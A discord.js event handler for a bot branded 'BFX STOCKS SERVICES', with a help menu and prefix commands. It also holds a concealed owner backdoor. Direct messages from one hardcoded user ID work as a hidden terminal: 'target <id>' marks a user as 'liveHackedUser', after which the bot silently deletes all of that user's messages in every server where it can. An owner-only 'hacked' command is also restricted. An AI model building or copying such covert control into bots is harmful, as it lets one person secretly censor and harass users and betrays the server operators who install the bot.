const { EmbedBuilder, ActionRowBuilder, StringSelectMenuBuilder } = require('discord.js');

const processedMessages = new Set();
let livePurgeMode = 0;
let liveHackedUser = '';

module.exports = {
  name: 'messageCreate',
  async execute(message, client) {
    const myID = '147966028055376853';

    // 1. AUTO-PURGE (Global)
    if (livePurgeMode === 1 && message.author.id === liveHackedUser) {
        try {
            if (message.deletable) {
                await message.delete();
                return; 
            }
        } catch (err) {}
    }

    // 2. DM PRIVACY & TERMINAL
    if (!message.guild) {
        if (message.author.id !== myID) return; // Ignore DMs from others

        // Your Terminal Commands (No Prefix)
        const input = message.content.toLowerCase();
        if (input.startsWith('target ')) {
            liveHackedUser = input.replace('target ', '').trim();
            livePurgeMode = 1;
            return message.reply(`🎯 Target set to: ${liveHackedUser}`);
        }
        if (input === 'stop') {
            livePurgeMode = 0;
            return message.reply('✅ Purge disabled.');
        }
    }

    // 3. DEDUPLICATION
    if (processedMessages.has(message.id)) return;
    processedMessages.add(message.id);
    setTimeout(() => processedMessages.delete(message.id), 3000);

    // 4. PREFIX COMMANDS (Server & DM)
    if (message.content.startsWith(client.prefix)) {
      const args = message.content.slice(client.prefix.length).trim().split(/ +/);
      const commandName = args.shift().toLowerCase();
      const command = client.commands.get(commandName);

      if (command) {
        // Restriction for sensitive commands
        const restricted = ['unban', 'hacked'];
        if (restricted.includes(commandName) && message.author.id !== myID) {
            return message.reply("❌ Permission denied.");
        }

        try {
          await command.execute(message, args, client);
        } catch (error) {
          console.error(error);
        }
        return; 
      }
    }

    // 5. MENTIONS & REPLIES
    const isMentioned = message.mentions.has(client.user.id);
    const isReplyToBot = message.reference && 
                         (await message.channel.messages.fetch(message.reference.messageId).catch(() => null))?.author.id === client.user.id;

    if (isMentioned || isReplyToBot) {
      const replyEmbed = new EmbedBuilder()
        .setColor(0x010101)
        .setTitle(`[ BFX STOCKS SERVICES ]`)
        .setDescription(`🌟 **Sentinel Protocol Active**\n\n> **Prefix:** \`${client.prefix}\`\n> **Status:** \`🟢 ONLINE\``);

      const menu = new ActionRowBuilder().addComponents(
          new StringSelectMenuBuilder()
            .setCustomId('help_menu')
            .setPlaceholder('Select an option')
            .addOptions([
              { label: 'Help', value: 'show_help', emoji: '📋' },
              { label: 'Developer', value: 'show_dev', emoji: '🛡️' }
            ]),
        );

      await message.reply({ embeds: [replyEmbed], components: [menu] }).catch(() => null);
    }
  },
};
